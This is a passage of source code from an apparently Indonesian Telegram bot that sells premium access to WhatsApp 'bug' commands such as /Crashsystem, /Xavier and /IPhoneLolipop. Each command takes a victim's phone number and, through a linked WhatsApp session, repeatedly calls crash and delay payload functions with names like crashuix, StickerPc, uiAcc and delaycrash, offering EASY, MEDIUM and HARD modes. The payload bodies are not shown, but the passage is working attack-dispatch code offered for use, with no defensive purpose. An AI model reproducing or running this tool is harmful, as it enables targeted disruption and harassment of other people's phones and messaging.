    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "#-𝖫𝗈𝗅𝗂𝗉𝗈𝗉", url: "https://t.me/Excation99" }]
                ]
            }
        });
    }

    const remaining = checkCooldown(userId);
    if (remaining > 0) {
    bot.sendMessage(msg.chat.id, `⏱️ Tunggu ${remaining} detik lagi!`);
    } else {
    bot.sendMessage(msg.chat.id, "🍭 Aksi berhasil, cooldown dimulai!");
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Silenty
𖥂 Status : 📍Mengirim Santet...
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 - @LolipopXR</blockquote>
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Silenty
𖥂 Status : 📍Mengirim Santet...
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 - @LolipopXR</blockquote> 
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 10; i++) {
         await StarDozerX(target, true);
         await new Promise(res => setTimeout(res, 300));
         await StarDozerX(target, true);
         await new Promise(res => setTimeout(res, 300));
         await StarDozerX(target, true);
         await new Promise(res => setTimeout(res, 300));
         }
         console.log(chalk.red(`𖣂 Succes Sending Bug 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Silenty
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 - @LolipopXR</blockquote>
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/Secretly (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const runtime = getBotRuntime();
    const randomImage = getRandomImage();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "#-𝖫𝗈𝗅𝗂𝗉𝗈𝗉", url: "https://t.me/Excation99" }]
                ]
            }
        });
    }

    const remaining = checkCooldown(userId);
    if (remaining > 0) {
    bot.sendMessage(msg.chat.id, `⏱️ Tunggu ${remaining} detik lagi!`);
    } else {
    bot.sendMessage(msg.chat.id, "🍭 Aksi berhasil, cooldown dimulai!");
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Secretly
𖥂 Status : 📍Mengirim Santet...
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 - @LolipopXR</blockquote>
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Secretly
𖥂 Status : 📍Mengirim Santet...
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 - @LolipopXR</blockquote> 
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 10; i++) {
         await UdhDelay(sock, target);
         await new Promise(res => setTimeout(res, 300));
         await AmeliaBeta(sock, target);
         await new Promise(res => setTimeout(res, 300));
         await UdhDelay(sock, target);
         await new Promise(res => setTimeout(res, 300));
         await AmeliaBeta(sock, target);
         await new Promise(res => setTimeout(res, 300));
         }
         console.log(chalk.red(`𖣂 Succes Sending Bug 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Secretly
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 - @LolipopXR</blockquote>
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/LolipopX (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const runtime = getBotRuntime();
    const randomImage = getRandomImage();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "#-𝖫𝗈𝗅𝗂𝗉𝗈𝗉", url: "https://t.me/Excation99" }]
                ]
            }
        });
    }

    const remaining = checkCooldown(userId);
    if (remaining > 0) {
    bot.sendMessage(msg.chat.id, `⏱️ Tunggu ${remaining} detik lagi!`);
    } else {
    bot.sendMessage(msg.chat.id, "🍭 Aksi berhasil, cooldown dimulai!");
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : LolipopX
𖥂 Status : 📍Mengirim Santet...
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 - @LolipopXR</blockquote>
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : LolipopX
𖥂 Status : 📍Mengirim Santet...
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 - @LolipopXR</blockquote> 
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 10; i++) {
         await UdhDelay(sock, target);
         await new Promise(res => setTimeout(res, 300));
         await AmeliaBeta(sock, target);
         await new Promise(res => setTimeout(res, 300));
         await UdhDelay(sock, target);
         await new Promise(res => setTimeout(res, 300));
         await AmeliaBeta(sock, target);
         await new Promise(res => setTimeout(res, 300));
         }
         console.log(chalk.red(`𖣂 Succes Sending Bug 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : LolipopX
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 - @LolipopXR</blockquote>
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
// === CRASHSYSTEM COMMAND ===
bot.onText(/\/Crashsystem (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  // cek akses premium
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "#-𝖫𝗈𝗅𝗂𝗉𝗈𝗉", url: "https://t.me/Excation99" }]
        ]
      }
    });
  }

  const remaining = checkCooldown(userId);
  if (remaining > 0) {
    return bot.sendMessage(chatId, `⏱️ Tunggu ${remaining} detik lagi!`);
  } else {
    bot.sendMessage(chatId, "🍭 Aksi berhasil, cooldown dimulai!");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  // Kirim pesan awal
  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : BlankLolipop
𖥂 Status : Select The Mode!
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 - @LolipopXR</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "SYSTEM MEDIUM", callback_data: `Crash:medium:${formattedNumber}` },
          { text: "SYSTEM HARD", callback_data: `Crash:hard:${formattedNumber}` }
        ],
        [
          { text: "SYSTEM EASY", callback_data: `Crash:easy:${formattedNumber}` },
          { text: "BATAL", callback_data: `Crash:cancel:${formattedNumber}` }
        ]
      ]
    }
  });

  // simpan request berdasarkan message_id
  crashRequestMap.set(sent.message_id, {
    requester: userId,
    target: formattedNumber
  });
});


bot.on("callback_query", async (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const fromId = callbackQuery.from.id;
  const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";
  const runtime = getBotRuntime();
  const date = getCurrentDate();

  if (!data?.startsWith("Crash:")) return bot.answerCallbackQuery(callbackQuery.id);

  const [, action, formattedNumber] = data.split(":");
  const target = `${formattedNumber}@s.whatsapp.net`;

  // cek requester
  const req = crashRequestMap.get(messageId);
  if (!req || req.requester !== fromId) {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "❌ Akses Di Tolak..! By Lolipop.",
      show_alert: true
    });
    return; // stop di sini
  }

  // cek premium
  if (!premiumUsers.some(u => u.id === fromId && new Date(u.expiresAt) > new Date())) {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "❌ Akses ditolak.",
      show_alert: true
    });
    return;
  }

  // tombol cancel
  if (action === "cancel") {
    await bot.editMessageCaption(
      `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
⚪️ Proses The Mode Cancel.
━━━━━━━━━━━━━━━━━━
<blockquote>𖥂 Created @LolipopXR</blockquote>
`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔙 𝖪𝖾𝗆𝖻𝖺𝗅𝗂", callback_data: "mainmenu" }]
          ]
        }
      }
    );
    crashRequestMap.delete(messageId);
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "Proses dibatalkan. Kembali ke menu utama."
    });
    return;
  }

  // edit caption status mulai
  await bot.editMessageCaption(
    `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Crashsystem
𖥂 Mode : ${action.toUpperCase()}
𖥂 Status : 📍Sedang mengirim...
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
`,
    { chat_id: chatId, message_id: messageId, parse_mode: "HTML" }
  );

  await bot.answerCallbackQuery(callbackQuery.id, { text: `Menjalankan Crashsystem (${action})...` });

  try {
    if (action === "easy") {
      for (let i = 0; i < 20; i++) {
        await crashuix(sock, target, ptcp = true);
        await new Promise(r => setTimeout(r, 500));
        await crashuix(sock, target, ptcp = true);
        await new Promise(r => setTimeout(r, 500));
        await crashuix(sock, target, ptcp = true);
        await new Promise(r => setTimeout(r, 500));
      }
    } else if (action === "medium") {
      for (let i = 0; i < 20; i++) {
        await StickerPc(sock, target);
        await new Promise(r => setTimeout(r, 500));
        await StickerPc(sock, target);
        await new Promise(r => setTimeout(r, 500));
        await StickerPc(sock, target);
        await new Promise(r => setTimeout(r, 500));
      }
    } else if (action === "hard") {
      for (let i = 0; i < 20; i++) {
        await newImage2(sock, target);
        await new Promise(r => setTimeout(r, 500));
        await uiAcc(target);
        await new Promise(r => setTimeout(r, 500));
        await newImage2(sock, target);
        await new Promise(r => setTimeout(r, 500));
        await uiAcc(target);
        await new Promise(r => setTimeout(r, 500));
      }
    }

    await bot.editMessageCaption(
      `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Crashsystem
𖥂 Mode : ${action.toUpperCase()}
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
            [{ text: "🔙 𝖪𝖾𝗆𝖻𝖺𝗅𝗂", callback_data: "mainmenu" }]
          ]
        }
      }
    );
  } catch (errLoop) {
    console.error(errLoop);
    await bot.editMessageCaption(`❌ Terjadi error saat proses: ${errLoop.message}`, {
      chat_id: chatId,
      message_id: messageId
    });
  } finally {
    crashRequestMap.delete(messageId);
  }
});

bot.onText(/\/Xavier (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const runtime = getBotRuntime();
    const randomImage = getRandomImage();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "#-𝖫𝗈𝗅𝗂𝗉𝗈𝗉", url: "https://t.me/Excation99" }]
                ]
            }
        });
    }

    const remaining = checkCooldown(userId);
    if (remaining > 0) {
    bot.sendMessage(msg.chat.id, `⏱️ Tunggu ${remaining} detik lagi!`);
    } else {
    bot.sendMessage(msg.chat.id, "🍭 Aksi berhasil, cooldown dimulai!");
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Xavier
𖥂 Status : 📍Mengirim Santet...
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 - @LolipopXR</blockquote>
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Xavier
𖥂 Status : 📍Mengirim Santet...
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 - @LolipopXR</blockquote> 
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 20; i++) {
         await delayInvisible(target, true);
         await new Promise(res => setTimeout(res, 500));
         await delayInvisible(target, true);
         await new Promise(res => setTimeout(res, 500));
         await delayInvisible(target, true);
         await new Promise(res => setTimeout(res, 500));
         await delayInvisible(target, true);
         await new Promise(res => setTimeout(res, 500));
         }
         console.log(chalk.red(`𖣂 Succes Sending Bug 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Xavier
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 - @LolipopXR</blockquote>
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/IPhoneLolipop (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  // cek akses premium
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "#-𝖫𝗈𝗅𝗂𝗉𝗈𝗉", url: "https://t.me/Excation99" }]
        ]
      }
    });
  }

  const remaining = checkCooldown(userId);
  if (remaining > 0) {
    return bot.sendMessage(chatId, `⏱️ Tunggu ${remaining} detik lagi!`);
  } else {
    bot.sendMessage(chatId, "🍭 Aksi berhasil, cooldown dimulai!");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  // Kirim pesan awal
  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : IPhoneLolipop
𖥂 Status : Select The Mode!
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 - @LolipopXR</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "IOS MEDIUM", callback_data: `IPhone:medium:${formattedNumber}` },
          { text: "IOS HARD", callback_data: `IPhone:hard:${formattedNumber}` }
        ],
        [
          { text: "IOS EASY", callback_data: `IPhone:easy:${formattedNumber}` },
          { text: "BATAL", callback_data: `IPhone:cancel:${formattedNumber}` }
        ]
      ]
    }
  });

  // simpan request berdasarkan message_id
  crashRequestMap.set(sent.message_id, {
    requester: userId,
    target: formattedNumber
  });
});


bot.on("callback_query", async (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const fromId = callbackQuery.from.id;
  const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";
  const runtime = getBotRuntime();
  const date = getCurrentDate();

  if (!data?.startsWith("IPhone:")) return bot.answerCallbackQuery(callbackQuery.id);

  const [, action, formattedNumber] = data.split(":");
  const target = `${formattedNumber}@s.whatsapp.net`;

  // cek requester
  const req = crashRequestMap.get(messageId);
  if (!req || req.requester !== fromId) {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "❌ Akses Di Tolak..! By Lolipop.",
      show_alert: true
    });
    return; // stop di sini
  }

  // cek premium
  if (!premiumUsers.some(u => u.id === fromId && new Date(u.expiresAt) > new Date())) {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "❌ Akses ditolak.",
      show_alert: true
    });
    return;
  }

  // tombol cancel
  if (action === "cancel") {
    await bot.editMessageCaption(
      `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
⚪️ Proses The Mode Cancel.
━━━━━━━━━━━━━━━━━━
<blockquote>𖥂 Created @LolipopXR</blockquote>
`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔙 𝖪𝖾𝗆𝖻𝖺𝗅𝗂", callback_data: "mainmenu" }]
          ]
        }
      }
    );
    crashRequestMap.delete(messageId);
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "Proses dibatalkan. Kembali ke menu utama."
    });
    return;
  }

  // edit caption status mulai
  await bot.editMessageCaption(
    `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : IPhoneLolipop
𖥂 Mode : ${action.toUpperCase()}
𖥂 Status : 📍Sedang mengirim...
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
`,
    { chat_id: chatId, message_id: messageId, parse_mode: "HTML" }
  );

  await bot.answerCallbackQuery(callbackQuery.id, { text: `Menjalankan Crashsystem (${action})...` });

  try {
    if (action === "easy") {
      for (let i = 0; i < 20; i++) {
        await delaycrash(sock, target, mention = false);
        await new Promise(r => setTimeout(r, 500));
        await delaycrash(sock, target, mention = false);
        await new Promise(r => setTimeout(r, 500));
        await delaycrash(sock, target, mention = false);
        await new Promise(r => setTimeout(r, 500));
      }
    } else if (action === "medium") {
      for (let i = 0; i < 20; i++) {
        await StickerPc(sock, target);
        await new Promise(r => setTimeout(r, 500));
        await StickerPc(sock, target);
        await new Promise(r => setTimeout(r, 500));
        await StickerPc(sock, target);
        await new Promise(r => setTimeout(r, 500));
      }
    } else if (action === "hard") {
      for (let i = 0; i < 20; i++) {
        await uiAcc(target);
        await new Promise(r => setTimeout(r, 500));
        await uiAcc(target);
        await new Promise(r => setTimeout(r, 500));
        await uiAcc(target);
        await new Promise(r => setTimeout(r, 500));
      }
    }

    await bot.editMessageCaption(
      `
